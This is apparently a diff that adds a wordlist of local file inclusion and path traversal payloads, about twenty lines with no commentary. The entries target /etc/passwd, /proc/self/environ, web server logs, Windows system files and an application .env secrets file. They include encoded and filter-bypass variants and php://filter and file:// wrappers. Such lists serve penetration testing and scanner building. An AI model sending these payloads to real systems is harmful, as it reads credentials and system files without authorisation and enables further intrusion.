@@ -1,0 +1,21 @@
+# Generic LFI/path traversal advanced payloads
+../../../../etc/passwd
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../etc/hosts
+../../../../etc/hostname
+../../../../etc/issue
+../../../../var/log/apache2/access.log
+../../../../var/log/nginx/access.log
+../../../../windows/win.ini
+../../../../windows/system32/drivers/etc/hosts
+..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+....//....//....//....//etc/passwd
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
+file:///etc/passwd
+/etc/passwd
+C:\windows\win.ini
+../../../../app/.env
